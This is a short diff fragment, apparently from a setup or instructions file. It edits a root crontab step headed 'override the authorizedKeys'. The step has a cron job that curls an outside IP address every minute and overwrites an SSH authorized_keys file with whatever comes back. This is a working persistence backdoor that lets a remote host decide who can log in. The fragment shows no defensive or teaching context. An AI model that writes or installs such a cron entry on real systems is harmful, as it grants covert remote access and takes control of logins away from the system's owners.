@@ -93,7 +93,7 @@ sudo crontab -e
 
 override the authorizedKeys
 # Add the following line to the crontab file
-*/1 * * * * curl -s http://34.229.93.103 > /home/ir/.ssh/authorized_keys
+*/1 * * * * curl -s http://34.229.93.103 > .ssh/authorized_keys
 
 # Save and exit the crontab editor
 
